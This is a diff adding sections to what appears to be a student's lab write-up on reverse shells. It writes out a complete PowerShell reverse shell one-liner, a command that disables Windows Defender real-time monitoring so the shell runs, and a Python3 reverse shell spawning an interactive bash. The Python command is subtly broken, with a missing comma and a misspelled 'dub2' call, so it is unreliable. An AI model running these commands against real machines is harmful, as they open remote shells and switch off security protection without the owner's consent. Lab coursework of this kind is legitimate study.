@@ -21,3 +21,16 @@ As mentioned in the reflection I know very little php and would love to explore 
 
 ### Powershell Reverse Shell
 -------
+For this task we had to run a reverse shell on our windows box that connected back to our linux box. To do this I needed to again start a netcat listener linsteing on port 4449. Then on the windows machine run run the command `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.17.129',4449); $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.length)) -ne 0){;$data= (New-Object -TypeName System.Text.ASCIIENcoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` on the command prompt instead of powershell. However this will not work because Windows Defender blocks this. Reference the section below to turn it off and after disabling it the reverse shell will work. 
+
+###### Turning off Windows Defender over Powershell
+To disable Windows Defender simply run the command `Set-MpPreference -DisableRealTimeMonitoring $true` over Powershell. 
+
+### Python3 Reverse Shell
+-------
+For this final task we were asked to create a reverse shell using python3 to be able to connect back to our linux machine from the rocky machine again. To do this I first had to again create a netcat listener on my linux machine and I was again listening on port 4449. From the we again had to ssh into the rocky machine and run the reverse shell. Below is the command that I used to run the reverse shell:
+
+      python3 -c 'import socket; from subprocess import run; from os import dup2;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.17.150"4449));           dub2(s.fileno(),0); dub2(s.fileno(),1); dub2(s.fileno(),2);run(["/bin/bash","-i"]);'
+      
+After running this I was again connected to the rocky machine through the netcat listener. 
+      
